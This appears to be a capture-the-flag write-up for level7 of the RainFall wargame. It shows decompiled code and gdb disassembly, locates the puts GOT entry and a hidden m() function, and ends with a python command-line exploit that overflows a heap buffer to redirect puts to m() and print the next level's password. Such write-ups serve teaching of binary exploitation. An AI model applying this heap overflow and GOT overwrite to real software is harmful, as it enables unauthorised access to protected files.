With Binary ninja we get this main:

	int32_t main(int32_t argc, char** argv, char** envp)

	08048531  char* eax = malloc(8)
	0804853e  *eax = 1
	08048556  *(eax + 4) = malloc(8)
	08048560  char* eax_4 = malloc(8)
	0804856d  *eax_4 = 2
	08048585  *(eax_4 + 4) = malloc(8)
	080485a0  strcpy(*(eax + 4), argv[1])
	080485bd  strcpy(*(eax_4 + 4), argv[2])
	080485eb  fgets(0x8049960, 0x44, fopen(0x80486eb, 0x80486e9))  {"/home/user/level8/.pass"}
	080485f7  puts(0x8048703)
	08048602  return 0

Also a non-executed function m():

	Dump of assembler code for function m:
   0x080484f4 <+0>:     push   %ebp
   0x080484f5 <+1>:     mov    %esp,%ebp
   0x080484f7 <+3>:     sub    $0x18,%esp
   0x080484fa <+6>:     movl   $0x0,(%esp)
   0x08048501 <+13>:    call   0x80483d0 <time@plt>
   0x08048506 <+18>:    mov    $0x80486e0,%edx
   0x0804850b <+23>:    mov    %eax,0x8(%esp)
   0x0804850f <+27>:    movl   $0x8049960,0x4(%esp)
   0x08048517 <+35>:    mov    %edx,(%esp)
   0x0804851a <+38>:    call   0x80483b0 <printf@plt>

m() is an uncalled function inside the binary, which prints the result of reading lv8 pass.
m() address-> "\xf4\x84\x04\x08"
/-------------------------------------------------/
We want to override the call to puts() function, and make the program run m() function instead.

(gdb) disas puts
			Dump of assembler code for function puts@plt:
			0x08048400 <+0>:     jmp    *0x8049928
			0x08048406 <+6>:     push   $0x28
			0x0804840b <+11>:    jmp    0x80483a0
"\x28\x99\x04\x08"
/-------------------------------------------------/

level7@RainFall:~$ ./level7 12345678901234567890 A
~~
level7@RainFall:~$ ./level7 123456789012345678901 A
Segmentation fault (core dumped)

ARGV1 overflows at char 21

/-------------------------------------------------/

./level7 `python -c 'print "A"*20 + "\x28\x99\x04\x08"'` `python -c 'print "\xf4\x84\x04\x08"'`
									---puts address---   					---m() address--